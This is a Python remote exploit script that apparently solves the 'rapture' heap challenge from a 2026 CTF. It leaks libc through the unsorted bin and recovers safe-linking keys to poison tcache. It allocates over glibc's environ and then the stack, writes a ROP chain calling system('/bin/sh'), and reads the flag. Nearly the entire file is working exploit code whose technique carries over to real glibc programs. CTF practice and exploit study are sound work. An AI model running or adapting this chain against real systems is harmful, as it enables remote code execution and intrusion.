#!/usr/bin/env python3
"""Remote exploit for z0d1akCTF 2026 Qualifiers: rapture."""

from __future__ import annotations

import argparse
import re
import socket
import ssl
import struct


DEFAULT_HOST = "rapture-895422919b25.chals.z0d1ak.org"
DEFAULT_PORT = 1337
MENU = b"diver> "
UNSORTED_ARENA_OFFSET = 0x21ACE0
ENVIRON_OFFSET = 0x222200
MAIN_RETURN_OFFSET = 0x29D90
POP_RDI_OFFSET = 0x2A3E5
SYSTEM_OFFSET = 0x50D70
BIN_SH_OFFSET = 0x1D8678
EXIT_OFFSET = 0x455F0
FLAG_PATTERN = re.compile(rb"zdk\{[^}\r\n]+\}")


def p64(value: int) -> bytes:
    return struct.pack("<Q", value)


def u64(data: bytes) -> int:
    return struct.unpack("<Q", data.ljust(8, b"\x00")[:8])[0]


class Tube:
    def __init__(self, host: str, port: int, timeout: float):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        raw = socket.create_connection((host, port), timeout=timeout)
        self.sock = context.wrap_socket(raw, server_hostname=host)
        self.buffer = bytearray()

    def close(self) -> None:
        self.sock.close()

    def send(self, data: bytes) -> None:
        self.sock.sendall(data)

    def sendline(self, value: int | bytes) -> None:
        data = str(value).encode() if isinstance(value, int) else value
        self.send(data + b"\n")

    def recv_exact(self, size: int) -> bytes:
        while len(self.buffer) < size:
            chunk = self.sock.recv(max(4096, size - len(self.buffer)))
            if not chunk:
                raise EOFError("connection closed")
            self.buffer.extend(chunk)
        result = bytes(self.buffer[:size])
        del self.buffer[:size]
        return result

    def recv_until(self, marker: bytes) -> bytes:
        while True:
            position = self.buffer.find(marker)
            if position >= 0:
                end = position + len(marker)
                result = bytes(self.buffer[:end])
                del self.buffer[:end]
                return result
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError(f"connection closed before {marker!r}")
            self.buffer.extend(chunk)

    def recv_all(self) -> bytes:
        data = bytearray(self.buffer)
        self.buffer.clear()
        while True:
            try:
                chunk = self.sock.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            data.extend(chunk)
        return bytes(data)


class Rapture:
    def __init__(self, tube: Tube):
        self.io = tube
        self.sizes: dict[int, int] = {}
        self.io.recv_until(MENU)

    def choose(self, option: int) -> None:
        self.io.sendline(option)

    def create(self, index: int, size: int) -> None:
        self.choose(1)
        self.io.recv_until(b"cell index> ")
        self.io.sendline(index)
        self.io.recv_until(b"ballast size> ")
        self.io.sendline(size)
        self.io.recv_until(MENU)
        self.sizes[index] = size

    def edit(self, index: int, data: bytes) -> None:
        size = self.sizes[index]
        if len(data) != size:
            raise ValueError(f"edit for cell {index} must be exactly {size} bytes")
        self.choose(2)
        self.io.recv_until(b"cell index> ")
        self.io.sendline(index)
        self.io.recv_until(b"ballast payload> ")
        self.io.send(data)
        self.io.recv_until(MENU)

    def free(self, index: int) -> None:
        self.choose(3)
        self.io.recv_until(b"cell index> ")
        self.io.sendline(index)
        self.io.recv_until(MENU)
        self.sizes.pop(index, None)

    def inspect(self, index: int) -> bytes:
        size = self.sizes[index]
        self.choose(4)
        self.io.recv_until(b"cell index> ")
        self.io.sendline(index)
        data = self.io.recv_exact(size)
        self.io.recv_until(MENU)
        return data

    def snapshot(self, source: int, backup: int) -> None:
        self.choose(5)
        self.io.recv_until(b"source index> ")
        self.io.sendline(source)
        self.io.recv_until(b"backup index> ")
        self.io.sendline(backup)
        self.io.recv_until(MENU)
        self.sizes[backup] = self.sizes[source]


def leak_unsorted(app: Rapture) -> tuple[int, int]:
    size = 0x408

    # Eight adjacent chunks, then a guard, then another large chunk and guard.
    for index in range(8):
        app.create(index, size)
    app.create(8, 0x18)
    app.create(9, size)
    app.create(10, 0x18)

    app.snapshot(7, 12)
    app.snapshot(9, 13)

    # Seven frees fill tcache. Cells 7 and 9 then enter the unsorted bin as
    # separate chunks, making cell 9's fd a heap pointer and bk an arena pointer.
    for index in range(8):
        app.free(index)
    app.free(9)

    leak = app.inspect(13)
    heap_pointer = u64(leak[0:8])
    arena_pointer = u64(leak[8:16])
    return heap_pointer, arena_pointer


def poison_allocate(
    app: Rapture,
    *,
    size: int,
    target: int,
    seed: int,
    alias: int,
    recycled: int,
    spacer: int,
    first_result: int,
    target_result: int,
) -> tuple[int, bytes]:
    """Return an allocation at target and the original safe-linking key leak."""
    app.create(seed, size)
    app.snapshot(seed, alias)
    app.free(seed)

    freed = app.inspect(alias)
    safe_link_key = u64(freed[:8])

    # Reclaim the seed, add a second chunk, then free spacer followed by seed.
    # The seed is now the tcache head with a count of two and alias can edit it.
    app.create(recycled, size)
    app.create(spacer, size)
    app.free(spacer)
    app.free(recycled)

    encoded_target = target ^ safe_link_key
    app.edit(alias, p64(encoded_target) + b"\x00" * (size - 8))
    app.create(first_result, size)
    app.create(target_result, size)
    return safe_link_key, freed


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST)
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    parser.add_argument("--timeout", type=float, default=30.0)
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()

    io = Tube(args.host, args.port, args.timeout)
    try:
        app = Rapture(io)
        heap_pointer, arena_pointer = leak_unsorted(app)
        libc_base = arena_pointer - UNSORTED_ARENA_OFFSET
        print(f"[+] unsorted heap pointer:  {heap_pointer:#x}")
        print(f"[+] unsorted arena pointer: {arena_pointer:#x}")
        print(f"[+] libc base:              {libc_base:#x}")
        if libc_base & 0xFFF:
            raise RuntimeError("calculated libc base is not page-aligned")

        environ_address = libc_base + ENVIRON_OFFSET
        key, _ = poison_allocate(
            app,
            size=0x3D8,
            target=environ_address,
            seed=0,
            alias=1,
            recycled=2,
            spacer=3,
            first_result=4,
            target_result=5,
        )
        environ_data = app.inspect(5)
        stack_environ = u64(environ_data[:8])
        print(f"[+] 0x3e0-bin safe-link key: {key:#x}")
        print(f"[+] environ stack pointer:  {stack_environ:#x}")

        stack_target = (stack_environ - 0x400) & ~0xF
        stack_key, _ = poison_allocate(
            app,
            size=0x3B8,
            target=stack_target,
            seed=6,
            alias=7,
            recycled=9,
            spacer=11,
            first_result=14,
            target_result=15,
        )
        stack_data = app.inspect(15)
        print(f"[+] 0x3c0-bin safe-link key: {stack_key:#x}")
        print(f"[+] leaked stack window:    {stack_target:#x}-{stack_target + len(stack_data):#x}")
        if args.verbose:
            print("[+] pointer-like stack words:")
            for offset in range(0, len(stack_data) - 7, 8):
                value = u64(stack_data[offset : offset + 8])
                if value >> 40 in (0x55, 0x56, 0x7F):
                    print(f"    +{offset:#05x}  {value:#018x}")

        saved_return = p64(libc_base + MAIN_RETURN_OFFSET)
        return_offset = stack_data.find(saved_return)
        if return_offset < 0 or return_offset % 8:
            raise RuntimeError("could not identify main's saved return address")
        print(f"[+] main saved return:      {stack_target + return_offset:#x}")

        pop_rdi = libc_base + POP_RDI_OFFSET
        ret = pop_rdi + 1
        chain = b"".join(
            map(
                p64,
                (
                    ret,
                    pop_rdi,
                    libc_base + BIN_SH_OFFSET,
                    libc_base + SYSTEM_OFFSET,
                    libc_base + EXIT_OFFSET,
                ),
            )
        )
        final_target = stack_target + return_offset - 8
        if final_target & 0xF:
            raise RuntimeError("final stack allocation is not 16-byte aligned")
        final_key, _ = poison_allocate(
            app,
            size=0x88,
            target=final_target,
            seed=16,
            alias=17,
            recycled=18,
            spacer=19,
            first_result=20,
            target_result=21,
        )
        print(f"[+] 0x90-bin safe-link key:  {final_key:#x}")

        final_payload = p64(0) + chain
        final_payload = final_payload.ljust(0x88, b"\x00")
        app.edit(21, final_payload)

        app.choose(6)
        io.send(b"cat /flag* 2>/dev/null; exit\n")
        output = io.recv_all()
        print(output.decode("utf-8", errors="replace"), end="")
        match = FLAG_PATTERN.search(output)
        if not match:
            raise RuntimeError("shell opened, but the response contained no flag")
        print(f"[+] flag: {match.group().decode()}")
    finally:
        io.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
